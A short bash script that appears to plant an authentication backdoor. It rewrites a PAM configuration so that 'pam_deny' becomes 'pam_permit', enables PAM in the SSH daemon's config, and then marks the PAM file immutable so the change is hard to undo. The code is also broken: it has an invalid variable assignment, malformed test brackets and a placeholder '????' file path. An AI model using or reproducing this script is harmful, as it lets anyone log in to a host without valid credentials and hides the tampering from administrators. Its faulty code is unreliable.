#!/bin/bash

OS = $(uname)

if [ "$OS" == "Linux"]
then
	#CentOS
	PAM_FILE="/etc/pam.d/password_auth"

fi
if [ "$OS" == "FreeBSD"]
then
	PAM_FILE="????"
fi

sed -i -e 's/auth	required	pam_deny.so/auth	required	pam_permit.so/' "$PAM_FILE"
sed -i -e 's/UsePAM no/UsePAM yes/' /etc/ssh/sshd_config

if [ "$OS" == "Linux" ]
then
	chattr +i "$PAM_FILE"
elif [ "$OS" == "FreeBSD" ]
then
	chflags schg "$PAM_FILE"
fi
